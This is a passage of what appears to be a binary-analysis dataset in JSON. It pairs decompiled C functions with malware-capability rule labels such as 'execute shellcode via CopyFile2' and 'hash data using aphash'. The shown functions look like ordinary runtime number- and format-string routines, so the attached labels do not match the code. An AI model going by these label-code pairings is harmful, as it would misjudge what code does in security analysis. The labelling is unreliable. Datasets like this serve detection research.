            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004064d3(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00405ae2();\n    if (cVar2 == '\\0') {\ncode_r0x004a3d0f:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00404331();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar6 = 0,  *(param_1 + 0x32) == 0x47)))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404c50(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.004059cf();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00405862(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a3d0f;\n            uVar4 = fcn.004059cf();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x32);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.0040312f();\n            arg_10h = fcn.004059cf();\n            fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.004022f2(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x32) == 0x67) || (*(param_1 + 0x32) == 0x47)) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405bf5(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x32) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1174
    },
    "004065b9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065b9(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 397
    },
    "004065ff": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004065ff(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105a(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 469
    },
    "0040675d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040675d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 455
    },
    "0040683e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040683e(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "0040684d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040684d(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404c50(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.004059cf();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1162
    },
    "004069a6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004069a6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 455
    },
    "004069ce": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004069ce(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a5deb;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a5deb;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a5deb:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004058a3(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.0040675d(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405128(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1116
    },
    "00406a0a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a0a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 456
    },
    "0040159b": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040159b(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00405939(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00401a55": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a55(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00404c41(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "00401af0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401af0(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a142f:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a1433:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1436:\n            cVar5 = fcn.00404c41(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a13db:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1436;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a13ef;\n                if (uVar7 < 0x45) goto code_r0x004a15bf;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a15bf;\n                    goto code_r0x004a13c3;\n                }\n            }\ncode_r0x004a143f:\n            cVar5 = fcn.00401e7e();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00402da1();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a143f;\n            if (uVar7 != 99) goto code_r0x004a15bf;\ncode_r0x004a13ef:\n            cVar5 = fcn.00404f25(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00403fda();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a143f;\n            if (uVar7 == 0x69) goto code_r0x004a142f;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00405542();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a15bf;\n                cVar5 = fcn.00401a55();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a15bf;\n                arg_ch_00 = 0;\n                goto code_r0x004a13db;\n            }\n            goto code_r0x004a1433;\n        }\ncode_r0x004a13c3:\n        cVar5 = fcn.0040119a();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004a15bf;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a14ca;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a14ca:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.004040ed(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.004061b3(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a15bf:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1730
    },
    "00401e56": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401e56(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.0040157d(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "004064f1": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004064f1(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0e93:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a0e97:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a0e9a:\n            cVar4 = fcn.00401f73(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0e3f:\n                arg_8h = 0x10;\n                goto code_r0x004a0e9a;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0e53;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a0e27;\n                }\n            }\ncode_r0x004a0ea3:\n            cVar4 = fcn.004059f2();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00406690();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0ea3;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0e53:\n            cVar4 = fcn.004033ff(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004024c8();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0ea3;\n            if (cVar4 == 'i') goto code_r0x004a0e93;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403d19();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00405bd7();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0e3f;\n            }\n            goto code_r0x004a0e97;\n        }\ncode_r0x004a0e27:\n        cVar4 = fcn.004013e3();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00402153();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a0f38;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0f38:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        